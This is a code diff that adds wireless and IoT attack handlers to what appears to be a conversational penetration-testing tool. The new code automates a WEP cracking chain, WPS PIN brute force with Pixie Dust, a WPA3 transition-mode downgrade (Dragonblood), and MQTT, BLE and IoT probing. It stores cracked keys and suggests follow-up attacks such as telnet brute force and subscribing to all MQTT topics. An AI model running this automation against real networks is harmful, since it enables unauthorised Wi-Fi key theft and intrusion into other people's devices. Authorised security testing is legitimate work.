@@ -66,6 +66,17 @@ INTENT_PATTERNS = [
     (r"(?:web\s*vuln\s*scan)\s+(\S+)", "nikto_scan"),
     (r"(?:smb\s*enum|enum4linux|smb\s*scan|netbios)\s+(\S+)", "smb_enum"),
     (r"(?:dns\s*lookup|nslookup|resolve)\s+(\S+)(?:\s+(\S+))?", "dns_lookup"),
+
+    # WPS / WEP / WPA3 / IoT — must be BEFORE generic scan catch-all
+    (r"(?:wash|wps\s*scan|scan\s*wps|wps\s*detect)(?:\s+(\S+))?", "wash_scan"),
+    (r"(?:wep\s*(?:attack|crack|hack)|crack\s*wep|attack\s*wep)\s+(\S+)(?:\s+(\S+))?", "wep_attack"),
+    (r"(?:wps\s*brute|brute\s*wps|wps\s*pin|pin\s*brute)\s+(\S+)(?:\s+(\d+))?", "wps_brute"),
+    (r"(?:wpa3\s*(?:check|scan|detect|probe)|sae\s*(?:check|scan|detect))\s+(\S+)(?:\s+(\S+))?", "wpa3_check"),
+    (r"(?:wpa3\s*(?:downgrade|attack|crack)|sae\s*(?:downgrade|attack)|dragonblood)\s+(\S+)(?:\s+(\d+))?", "wpa3_downgrade"),
+    (r"(?:iot\s*scan|iot\s*recon|smart\s*home\s*scan|device\s*scan)\s+(\S+)", "iot_scan"),
+    (r"(?:ble\s*scan|bluetooth\s*scan|bt\s*scan)(?:\s+(\S+))?", "ble_scan"),
+    (r"(?:mqtt\s*scan|mqtt\s*probe|mqtt\s*enum)\s+(\S+)", "mqtt_scan"),
+
     # Generic recon catch-all (MUST be last in this section)
     (r"(?:scan|recon|enumerate|discover)\s+(.+)", "recon"),
 
@@ -1251,6 +1262,212 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         if len(aps) > 20:
             lines.append(f"  ... and {len(aps) - 20} more")
         return "\n".join(lines)
+
+    # ── Wireless protocol handlers ──────────────────────────────
+
+    def _do_wash_scan(self, m, raw) -> str:
+        """Scan for WPS-enabled access points using wash."""
+        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("monitor_interface") or self.context.get("interface")
+        if not iface:
+            return "[!] No interface. Use: wash wlan0mon\n    Enable monitor mode first."
+        result = self.orch.reaver.wash_scan(iface)
+        aps = result.get("aps", [])
+        if not aps:
+            return f"📡 No WPS-enabled APs found on {iface}.\n  Make sure you're in monitor mode."
+        lines = [f"📡 WPS Access Points ({len(aps)}):"]
+        lines.append(f"{'BSSID':<20} {'ESSID':<22} {'CH':>3} {'RSSI':>5} {'VER':>4} {'LOCKED'}")
+        lines.append("─" * 72)
+        for ap in aps:
+            lock = "🔒 YES" if ap.get("wps_locked") else "🔓 NO"
+            lines.append(
+                f"{ap['bssid']:<20} {ap.get('essid',''):<22} {ap.get('channel',''):>3} "
+                f"{ap.get('rssi',''):>5} {ap.get('wps_version',''):>4} {lock}"
+            )
+        lines.append("")
+        lines.append("💡 Attack unlocked APs with: wps brute <BSSID> <channel>")
+        lines.append("   Or try Pixie Dust: run skill wps_pixie")
+        return "\n".join(lines)
+
+    def _do_wep_attack(self, m, raw) -> str:
+        """WEP attack chain: fake auth → ARP replay → crack."""
+        bssid = m.group(1)
+        iface = m.group(2) if m.lastindex and m.lastindex >= 2 and m.group(2) else self.context.get("monitor_interface") or self.context.get("interface")
+        if not iface:
+            return "[!] Need an interface. Use: wep attack <BSSID> <iface>\n    Enable monitor first."
+
+        lines = ["⚡ WEP Attack Chain", f"  Target: {bssid}", f"  Interface: {iface}", ""]
+
+        # Step 1: Fake auth
+        lines.append("  [1/3] Fake authentication...")
+        try:
+            self.orch.aircrack.fake_auth(iface, bssid)
+            lines.append("        ✅ Associated")
+        except Exception as e:
+            lines.append(f"        ⚠ Auth issue: {e}")
+
+        # Step 2: ARP replay (short burst to collect IVs)
+        lines.append("  [2/3] ARP replay (collecting IVs, 60s)...")
+        try:
+            self.orch.aircrack.arp_replay(iface, bssid, timeout=60)
+            lines.append("        ✅ IV collection complete")
+        except Exception:
+            lines.append("        ⚠ ARP replay timeout (may need more time)")
+
+        # Step 3: Crack
+        lines.append("  [3/3] Cracking WEP key...")
+        import glob
+        caps = glob.glob("/tmp/*wep*.cap") + glob.glob("/tmp/*.cap")
+        if caps:
+            result = self.orch.aircrack.crack_wep(caps[-1], bssid=bssid)
+            if result.get("found"):
+                key = result["key"]
+                lines.append(f"        🔑 KEY FOUND: {key}")
+                self.orch.save_cracked_key(bssid, key, method="WEP")
+            else:
+                lines.append("        ❌ Not enough IVs yet. Run longer or try chopchop.")
+        else:
+            lines.append("        ❌ No capture file found. Start airodump first.")
+
+        return "\n".join(lines)
+
+    def _do_wps_brute(self, m, raw) -> str:
+        """Full WPS PIN brute-force against a target BSSID."""
+        bssid = m.group(1)
+        channel = int(m.group(2)) if m.lastindex and m.lastindex >= 2 and m.group(2) else 0
+        iface = self.context.get("monitor_interface") or self.context.get("interface")
+        if not iface:
+            return "[!] No interface set. Enable monitor mode first."
+        if not channel:
+            return f"[!] Need channel. Use: wps brute {bssid} <channel>"
+
+        lines = [f"🔓 WPS PIN Brute-Force", f"  Target: {bssid} (ch {channel})", f"  Interface: {iface}", ""]
+
+        # Try Pixie Dust first (fast)
+        lines.append("  [1/2] Trying Pixie Dust (fast)...")
+        result = self.orch.reaver.pixie_dust(iface, bssid, channel=channel)
+        if result.get("success"):
+            lines.append(f"        🔑 PIN: {result['pin']}")
+            if result.get("wpa_psk"):
+                lines.append(f"        🔑 PSK: {result['wpa_psk']}")
+                self.orch.save_cracked_key(bssid, result["wpa_psk"], method="WPS-Pixie")
+            return "\n".join(lines)
+
+        lines.append("        ❌ Pixie Dust failed — falling back to brute-force")
+        lines.append("  [2/2] Full PIN brute (this takes hours)...")
+        result = self.orch.reaver.brute_force(iface, bssid, channel=channel, timeout=600)
+        if result.get("success"):
+            lines.append(f"        🔑 PIN: {result['pin']}")
+            if result.get("wpa_psk"):
+                lines.append(f"        🔑 PSK: {result['wpa_psk']}")
+                self.orch.save_cracked_key(bssid, result["wpa_psk"], method="WPS-Brute")
+        else:
+            prog = result.get("progress", "")
+            lines.append(f"        ⏳ Partial progress: {prog}")
+            lines.append("        Run again to resume — reaver saves state.")
+
+        return "\n".join(lines)
+
+    def _do_wpa3_check(self, m, raw) -> str:
+        """Check if a target AP supports WPA3/SAE."""
+        bssid = m.group(1)
+        iface = m.group(2) if m.lastindex and m.lastindex >= 2 and m.group(2) else self.context.get("interface")
+        if not iface:
+            return "[!] Need an interface. Use: wpa3 check <BSSID> <iface>"
+
+        result = self.orch.wpa3.check_sae_support(iface, bssid)
+        lines = [f"🔐 WPA3/SAE Check — {bssid}", ""]
+        lines.append(f"  SAE (WPA3):      {'✅ YES' if result['supports_sae'] else '❌ NO'}")
+        lines.append(f"  OWE (Open+Enc):  {'✅ YES' if result['supports_owe'] else '❌ NO'}")
+        lines.append(f"  Transition Mode: {'⚠️ YES (exploitable!)' if result['transition_mode'] else '❌ NO'}")
+        lines.append("")
+        if result['transition_mode']:
+            lines.append("  💡 Transition mode detected! Try: wpa3 downgrade " + bssid)
+        elif result['supports_sae']:
+            lines.append("  ⚠ Pure WPA3 — limited attack surface.")
+            lines.append("  💡 Try SAE timing probe for side-channel: sae timing " + bssid)
+        else:
+            lines.append("  💡 Standard WPA2 — use handshake capture + crack.")
+        return "\n".join(lines)
+
+    def _do_wpa3_downgrade(self, m, raw) -> str:
+        """WPA3 transition mode downgrade attack."""
+        bssid = m.group(1)
+        channel = int(m.group(2)) if m.lastindex and m.lastindex >= 2 and m.group(2) else 0
+        iface = self.context.get("monitor_interface") or self.context.get("interface")
+        if not iface:
+            return "[!] No interface. Enable monitor mode first."
+        if not channel:
+            return f"[!] Need channel. Use: wpa3 downgrade {bssid} <channel>"
+
+        lines = [f"🐉 WPA3 Downgrade Attack (Dragonblood)", f"  Target: {bssid} (ch {channel})", ""]
+        result = self.orch.wpa3.downgrade_attack(iface, bssid, channel=channel)
+        for log in result.get("log", []):
+            lines.append(f"  → {log}")
+        if result.get("success"):
+            lines.append("")
+            lines.append(f"  🔑 Handshake captured! File: {result['capture_file']}")
+            lines.append(f"  💡 Crack with: crack wpa {result['capture_file']}")
+        else:
+            lines.append("  ❌ No WPA2 fallback handshake captured.")
+            lines.append("  💡 Try again with more deauths or check if transition mode is active.")
+        return "\n".join(lines)
+
+    def _do_iot_scan(self, m, raw) -> str:
+        """IoT device scan — banner grab + protocol detection."""
+        target = m.group(1)
+        self.context["target"] = target
+        result = self.orch.iot.banner_grab(target)
+        services = result.get("services", [])
+        lines = [f"🏠 IoT Scan — {target}", f"  {len(services)} service(s) found:", ""]
+        for svc in services:
+            lines.append(f"  → {svc}")
+        if not services:
+            lines.append("  No open IoT ports found.")
+        else:
+            lines.append("")
+            # Suggest protocol-specific follow-ups
+            output = result.get("output", "")
+            if "1883" in output or "mqtt" in output.lower():
+                lines.append("  💡 MQTT detected! Try: mqtt scan " + target)
+            if "5683" in output or "coap" in output.lower():
+                lines.append("  💡 CoAP detected! Manual probe: coap-client coap://" + target)
+            if "80" in output or "8080" in output:
+                lines.append("  💡 Web interface found! Try: web pwn " + target)
+            if "23" in output or "telnet" in output.lower():
+                lines.append("  ⚠ Telnet open — try default creds: brute " + target + " telnet")
+        return "\n".join(lines)
+
+    def _do_ble_scan(self, m, raw) -> str:
+        """Scan for Bluetooth Low Energy devices."""
+        result = self.orch.iot.scan_ble()
+        devices = result.get("devices", [])
+        if not devices:
+            return "📶 No BLE devices found.\n  Make sure Bluetooth adapter is available."
+        lines = [f"📶 BLE Devices ({len(devices)}):"]
+        lines.append(f"{'MAC':<20} {'Name'}")
+        lines.append("─" * 50)
+        for d in devices[:30]:
+            lines.append(f"  {d['mac']:<20} {d['name']}")
+        return "\n".join(lines)
+
+    def _do_mqtt_scan(self, m, raw) -> str:
+        """Probe an MQTT broker for open access."""
+        target = m.group(1)
+        self.context["target"] = target
+        result = self.orch.iot.scan_mqtt(target)
+        if result.get("open"):
+            lines = [f"📡 MQTT Broker — {target}:1883", "  ⚠ OPEN (no auth required!)", ""]
+            msgs = result.get("messages", [])
+            if msgs:
+                lines.append(f"  Captured {len(msgs)} message(s):")
+                for msg in msgs[:10]:
+                    lines.append(f"    → {msg[:100]}")
+            lines.append("")
+            lines.append("  💡 This broker has no authentication!")
+            lines.append("  💡 Subscribe to all: mosquitto_sub -h " + target + " -t '#'")
+            lines.append("  💡 Publish test: mosquitto_pub -h " + target + " -t test -m 'hello'")
+            return "\n".join(lines)
+        return f"📡 MQTT — {target}:1883\n  ❌ Broker not accessible or requires authentication."
 
     def _do_kill_james(self, m, raw) -> str:
         summary = self.orch.kill_james()
